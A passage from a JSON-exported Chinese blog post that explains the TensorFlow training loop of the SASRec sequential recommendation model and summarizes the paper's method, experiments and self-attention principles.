class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f = <span class=\"built_in\">open</span>(os.path.join(args.dataset + <span class=\"string\">&#x27;_&#x27;</span> + args.train_dir, <span class=\"string\">&#x27;log.txt&#x27;</span>), <span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">config = tf.ConfigProto()</span><br><span class=\"line\">config.gpu_options.allow_growth = <span class=\"literal\">True</span></span><br><span class=\"line\">config.allow_soft_placement = <span class=\"literal\">True</span></span><br><span class=\"line\">sess = tf.Session(config=config)</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：打开日志文件 <code>log.txt</code> ，配置 TensorFlow 会话以允许 GPU 动态增长和软设备放置，并创建会话。</p>\n<h3 id=\"数据采样器和模型初始化\"><a class=\"anchor\" href=\"#数据采样器和模型初始化\">#</a> 数据采样器和模型初始化</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sampler = WarpSampler(user_train, usernum, itemnum, batch_size=args.batch_size, maxlen=args.maxlen, n_workers=<span class=\"number\">3</span>)</span><br><span class=\"line\">model = Model(usernum, itemnum, args)</span><br><span class=\"line\">sess.run(tf.initialize_all_variables())</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：初始化数据采样器 <code>WarpSampler</code>  和模型 <code>Model</code> ，并初始化所有 TensorFlow 变量。</p>\n<h3 id=\"训练过程\"><a class=\"anchor\" href=\"#训练过程\">#</a> 训练过程</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">T = <span class=\"number\">0.0</span></span><br><span class=\"line\">t0 = time.time()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> epoch <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, args.num_epochs + <span class=\"number\">1</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> step <span class=\"keyword\">in</span> tqdm(<span class=\"built_in\">range</span>(num_batch), total=num_batch, ncols=<span class=\"number\">70</span>, leave=<span class=\"literal\">False</span>, unit=<span class=\"string\">&#x27;b&#x27;</span>):</span><br><span class=\"line\">            u, seq, pos, neg = sampler.next_batch()</span><br><span class=\"line\">            auc, loss, _ = sess.run([model.auc, model.loss, model.train_op],</span><br><span class=\"line\">                                    &#123;model.u: u, model.input_seq: seq, model.pos: pos, model.neg: neg,</span><br><span class=\"line\">                                     model.is_training: <span class=\"literal\">True</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> epoch % <span class=\"number\">20</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            t1 = time.time() - t0</span><br><span class=\"line\">            T += t1</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Evaluating&#x27;</span>, end=<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">            t_test = evaluate(model, dataset, args, sess)</span><br><span class=\"line\">            t_valid = evaluate_valid(model, dataset, args, sess)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;epoch:%d, time: %f(s), valid (NDCG@10: %.4f, HR@10: %.4f), test (NDCG@10: %.4f, HR@10: %.4f)&#x27;</span> % (</span><br><span class=\"line\">            epoch, T, t_valid[<span class=\"number\">0</span>], t_valid[<span class=\"number\">1</span>], t_test[<span class=\"number\">0</span>], t_test[<span class=\"number\">1</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\">            f.write(<span class=\"built_in\">str</span>(t_valid) + <span class=\"string\">&#x27; &#x27;</span> + <span class=\"built_in\">str</span>(t_test) + <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">            f.flush()</span><br><span class=\"line\">            t0 = time.time()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    sampler.close()</span><br><span class=\"line\">    f.close()</span><br><span class=\"line\">    exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br><span class=\"line\">sampler.close()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Done&quot;</span>)</span><br></pre></td></tr></table></figure></p>\n<p><strong>作用</strong>：训练模型并在每 20 个 epoch 后评估模型性能。</p>\n<ul>\n<li>\n<p><strong>变量初始化</strong>：</p>\n<ul>\n<li><code>T</code> ：总时间。</li>\n<li><code>t0</code> ：当前时间。</li>\n</ul>\n</li>\n<li>\n<p><strong>训练循环</strong>：</p>\n<ul>\n<li>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> epoch <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">.</span>num_epochs <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>code￼<span class=\"token number\">69</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  ：迭代每个批次，使用</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>code￼<span class=\"token number\">70</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  显示进度条。</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token operator\">-</span> 调用`sampler<span class=\"token punctuation\">.</span>next_batch<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>`获取一个批次的数据（用户、序列、正样本、负样本）。</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token operator\">-</span> 调用`sess<span class=\"token punctuation\">.</span>run`运行模型的训练操作，并获取AUC和损失值。</pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li>\n<p><strong>评估模型</strong>：</p>\n<ul>\n<li>每 20 个 epoch 进行一次评估。\n<ul>\n<li>计算评估时间 <code>t1</code>  并累加到总时间 <code>T</code> 。</li>\n<li>调用 <code>evaluate</code>  和 <code>evaluate_valid</code>  函数评估模型在测试集和验证集上的性能。</li>\n<li>打印评估结果并写入日志文件。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>异常处理和资源清理</strong>：</p>\n<ul>\n<li>使用 <code>try-except</code>  块捕捉异常，确保在异常发生时关闭采样器和日志文件。</li>\n<li>正常结束训练时，同样关闭采样器和日志文件，并打印 &quot;Done&quot;。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<h2 id=\"自注意力序列推荐\"><a class=\"anchor\" href=\"#自注意力序列推荐\">#</a> 自注意力序列推荐</h2>\n<h3 id=\"摘要\"><a class=\"anchor\" href=\"#摘要\">#</a> 摘要</h3>\n<ul>\n<li><strong>目标</strong>：在推荐系统中捕捉用户活动的序列动态，平衡马尔可夫链（MCs）和循环神经网络（RNNs）。</li>\n<li><strong>提出的模型</strong>：SASRec（自注意力序列推荐）使用自注意力机制，关注相关的过去行为来预测下一个物品。</li>\n<li><strong>性能</strong>：在稀疏和密集数据集上优于最先进的 MC/CNN/RNN 模型，并且效率更高。</li>\n</ul>\n<h3 id=\"引言\"><a class=\"anchor\" href=\"#引言\">#</a> 引言</h3>\n<ul>\n<li><strong>序列动态</strong>：现代推荐系统中，理解用户最近行为的上下文非常关键。</li>\n<li><strong>MCs vs RNNs</strong>：MCs 在处理稀疏数据时表现良好，但上下文范围有限；RNNs 能捕捉长期依赖，但需要密集数据。</li>\n<li><strong>SASRec</strong>：结合两者的优势，使用自注意力机制考虑相关的过去行为来预测未来行为。</li>\n</ul>\n<h3 id=\"方法\"><a class=\"anchor\" href=\"#方法\">#</a> 方法</h3>\n<h4 id=\"嵌入层-3\"><a class=\"anchor\" href=\"#嵌入层-3\">#</a> 嵌入层</h4>\n<ul>\n<li><strong>输入序列转换</strong>：将用户行为序列转换为固定长度序列，必要时使用填充。</li>\n<li><strong>物品嵌入矩阵</strong>：在潜在空间中表示物品。</li>\n<li><strong>位置嵌入</strong>：为物品嵌入添加位置信息，以考虑行为的顺序。</li>\n</ul>\n<h4 id=\"自注意力块\"><a class=\"anchor\" href=\"#自注意力块\">#</a> 自注意力块</h4>\n<ul>\n<li><strong>注意力机制</strong>：计算所有值的加权和，关注相关的过去行为。</li>\n<li><strong>自注意力层</strong>：使用相同的对象作为查询、键和值来捕捉依赖关系。</li>\n<li><strong>因果性</strong>：确保模型在预测下一个物品时只考虑过去的物品。</li>\n<li><strong>前馈网络</strong>：添加非线性，并考虑潜在维度之间的交互。</li>\n</ul>\n<h4 id=\"堆叠自注意力块-2\"><a class=\"anchor\" href=\"#堆叠自注意力块-2\">#</a> 堆叠自注意力块</h4>\n<ul>\n<li><strong>多块</strong>：堆叠多个自注意力块以捕捉复杂的物品转移。</li>\n<li><strong>残差连接、层归一化和 Dropout</strong>：防止过拟合并稳定训练。</li>\n</ul>\n<h4 id=\"预测层-2\"><a class=\"anchor\" href=\"#预测层-2\">#</a> 预测层</h4>\n<ul>\n<li><strong>MF 层</strong>：使用矩阵分解根据转换后的序列预测物品的相关性。</li>\n<li><strong>共享物品嵌入</strong>：通过使用单一的物品嵌入矩阵减少模型大小并防止过拟合。</li>\n</ul>\n<h4 id=\"网络训练\"><a class=\"anchor\" href=\"#网络训练\">#</a> 网络训练</h4>\n<ul>\n<li><strong>二元交叉熵损失</strong>：使用 Adam 优化器优化模型。</li>\n<li><strong>负采样</strong>：在训练过程中为每个正样本生成负样本。</li>\n</ul>\n<h4 id=\"复杂度分析\"><a class=\"anchor\" href=\"#复杂度分析\">#</a> 复杂度分析</h4>\n<ul>\n<li><strong>空间复杂度</strong>：相对于其他方法适中。</li>\n<li><strong>时间复杂度</strong>：由于自注意力层的可并行化，效率较高。</li>\n</ul>\n<h3 id=\"实验-2\"><a class=\"anchor\" href=\"#实验-2\">#</a> 实验</h3>\n<h4 id=\"数据集-2\"><a class=\"anchor\" href=\"#数据集-2\">#</a> 数据集</h4>\n<ul>\n<li><strong>Amazon、Steam、MovieLens</strong>：数据集在领域、平台和稀疏性方面各不相同。</li>\n</ul>\n<h4 id=\"比较方法\"><a class=\"anchor\" href=\"#比较方法\">#</a> 比较方法</h4>\n<ul>\n<li><strong>通用推荐方法</strong>：PopRec, BPR。</li>\n<li><strong>序列推荐方法</strong>：FMC, FPMC, TransRec。</li>\n<li><strong>基于深度学习的方法</strong>：GRU4Rec, GRU4Rec+, Caser。</li>\n</ul>\n<h4 id=\"实现细节\"><a class=\"anchor\" href=\"#实现细节\">#</a> 实现细节</h4>\n<ul>\n<li><strong>架构</strong>：使用两个自注意力块和共享物品嵌入。</li>\n<li><strong>优化</strong>：Adam 优化器，学习率 0.001，批量大小 128。</li>\n</ul>\n<h4 id=\"评估指标\"><a class=\"anchor\" href=\"#评估指标\">#</a> 评估指标</h4>\n<ul>\n<li><strong>Hit Rate@10 和 NDCG@10</strong>：评估推荐性能的指标。</li>\n</ul>\n<h3 id=\"结果\"><a class=\"anchor\" href=\"#结果\">#</a> 结果</h3>\n<ul>\n<li><strong>性能</strong>：SASRec 在稀疏和密集数据集上优于基线方法。</li>\n<li><strong>消融研究</strong>：分析架构中不同组件的影响。</li>\n<li><strong>训练效率和可扩展性</strong>：展示了更快的训练速度和对更长序列的可扩展性。</li>\n</ul>\n<h3 id=\"结论\"><a class=\"anchor\" href=\"#结论\">#</a> 结论</h3>\n<ul>\n<li><strong>SASRec</strong>：一个新颖的基于自注意力的模型，自适应地考虑用户行为进行预测，在性能和效率上优于最先进的方法。</li>\n<li><strong>未来工作</strong>：结合丰富的上下文信息和处理超长序列。</li>\n</ul>\n<h3 id=\"原理介绍\"><a class=\"anchor\" href=\"#原理介绍\">#</a> 原理介绍</h3>\n<ul>\n<li><strong>自注意力机制</strong>：通过计算查询、键和值之间的加权和，关注输入序列中的相关部分。与传统的 RNN 不同，自注意力机制能够并行处理所有时间步，使得模型能够高效地捕捉序列中的长距离依赖。</li>\n<li><strong>残差连接</strong>：在每个自注意力块中添加输入和输出之间的直接连接，有助于训练更深层的网络。</li>\n<li><strong>层归一化</strong>：对每一层的输出进行归一化处理，防止梯度消失和爆炸，提升模型的训练稳定性。</li>\n<li><strong>前馈网络</strong>：在每个自注意力块后添加一个全连接层，增加模型的非线性表示能力。</li>\n<li><strong>位置嵌入</strong>：为每个序列位置添加位置信息，使模型能够识别行为的顺序关系。</li>\n</ul>\n",
            "tags": [
                "Hexo",
                "Front Matter",
                "code",
                "recommendation"
            ]
        }
    ]
}